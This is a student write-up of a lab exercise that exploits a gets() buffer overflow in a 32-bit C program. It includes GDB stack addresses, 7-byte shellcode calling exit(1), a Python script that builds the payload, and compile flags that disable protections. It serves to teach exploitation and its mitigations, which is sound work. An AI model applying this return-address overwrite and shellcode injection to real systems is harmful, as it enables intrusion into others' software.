---
title: "Machine Problem 1: Buffer Overflow to Exit"
subtitle: "Stack Smash Attack — Writeup"
date: "2026-03-09"
author: "Jed Edison Donaire"
excerpt: "Exploiting a buffer overflow in a 32-bit C program by overwriting the saved return address with shellcode that calls exit(1), using gets() and the x86 int $0x80 syscall interface."
heroImage: "hero.jpg"
thumbnail: "hero.jpg"
---

## 1. Objective

The goal of this exercise is to exploit a buffer overflow vulnerability in a 32-bit C program (`vuln.c`) that enters an infinite loop after accepting input. By crafting a malicious input payload ("shellcode"), we overwrite the saved return address on the stack and redirect execution to our own code, which calls the Linux `exit(1)` system call — causing the program to terminate with exit code 1.

## 2. Vulnerability Analysis

The vulnerable function is:

```c
void vuln() {
    char buffer[8];
    gets(buffer);   // no bounds checking!
}
```

The `gets()` function reads input with no length limit, allowing an attacker to write past the end of `buffer[8]` and overwrite adjacent stack data — including the saved base pointer (EBP) and saved return address (EIP).

## 3. Stack Layout

Using GDB, we identified the following addresses inside `vuln()`:

```
(gdb) print &buffer   =>  0xffffd6c8
(gdb) info frame      =>  frame at 0xffffd6d8, saved eip = 0x565561aa
```

The stack layout at the time of the overflow:

| Address     | Content                          |
|------------|-----------------------------------|
| 0xffffd6c8 | [ buffer: 8 bytes ]  ← our shellcode goes here |
| 0xffffd6d0 | [ saved EBP: 4 bytes ]  ← overwritten with junk |
| 0xffffd6d4 | [ saved EIP: 4 bytes ]  ← overwritten with &buffer |

To reach the saved EIP we need **12 bytes of padding** (8 bytes for buffer + 4 bytes for saved EBP), followed by the new return address.

## 4. Shellcode Design

We use the Linux x86 `int $0x80` syscall interface. To invoke `exit(1)` we need:

- `eax = 1` (syscall number for `sys_exit`)
- `ebx = 1` (exit code argument)

Assembly:

```asm
xor %eax, %eax   ; zero out eax
inc %eax         ; eax = 1  (sys_exit syscall number)
mov %eax, %ebx   ; ebx = 1  (exit code = 1)
int $0x80        ; trigger kernel syscall
```

Corresponding machine code bytes (obtained via objdump):

```
\x31\xc0   xor %eax, %eax
\x40       inc %eax
\x89\xc3   mov %eax, %ebx
\xcd\x80   int $0x80
```

Total shellcode size: **7 bytes**.

## 5. Payload Construction

The final payload layout (20 bytes total):

```
[ shellcode: 7 bytes ] [ NOP sled: 5 bytes ] [ fake EBP: 4 bytes ] [ new EIP: 4 bytes ]
  31 c0 40 89 c3 cd 80   90 90 90 90 90         41 41 41 41          c8 d6 ff ff
```

The new EIP (`0xffffd6c8`, little-endian: `\xc8\xd6\xff\xff`) points directly to the start of our shellcode in the buffer.

The egg file was generated with:

```python
python3 -c "
import struct
shellcode = b'\x31\xc0\x40\x89\xc3\xcd\x80'
padding   = b'\x90' * 5
fake_ebp  = b'\x41' * 4
ret_addr  = struct.pack('<I', 0xffffd6c8)
open('egg','wb').write(shellcode + padding + fake_ebp + ret_addr)
"
```

## 6. Running the Exploit

Compile the vulnerable program:

```bash
gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 \
    -fno-pie -ggdb -z execstack -std=c99 vuln.c -o vuln
```

Run the exploit:

```bash
./vuln < egg
echo $?    # outputs: 1
```

The program overflows the buffer, jumps to our shellcode, and calls `exit(1)`, terminating with exit code 1 instead of spinning forever in the `while(1)` loop.

## 7. Conclusion

This exercise demonstrates how the absence of bounds checking in legacy functions like `gets()` allows an attacker to take full control of a program's execution flow. By carefully crafting a payload that overwrites the saved return address with the address of our injected shellcode, we were able to terminate a non-terminating program with a specific exit code. Modern mitigations such as stack canaries (`-fstack-protector`), non-executable stacks (NX/DEP), and ASLR are specifically designed to prevent this class of attack.
